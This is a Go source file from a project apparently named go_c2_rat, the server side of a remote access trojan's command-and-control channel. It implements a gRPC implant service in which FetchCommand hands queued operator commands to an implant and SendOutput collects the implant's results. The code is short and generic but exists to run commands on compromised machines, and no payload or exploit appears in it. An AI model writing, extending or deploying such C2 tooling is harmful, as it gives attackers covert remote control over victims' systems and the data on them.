package server

import (
	"context"
	"errors"

	"github.com/jonaserhart/go_c2_rat/pb"
)

type implantServer struct {
	pb.UnimplementedImplantServer
	work, output chan *pb.Command
}

func NewImplantserver(work, output chan *pb.Command) *implantServer {
	return &implantServer{work: work, output: output}
}

func (i implantServer) FetchCommand(ctx context.Context, empty *pb.Empty) (*pb.Command, error) {
	cmd := new(pb.Command)
	select {
	case cmd, ok := <-i.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (i implantServer) SendOutput(ctx context.Context, result *pb.Command) (*pb.Empty, error) {
	i.output <- result
	return &pb.Empty{}, nil
}
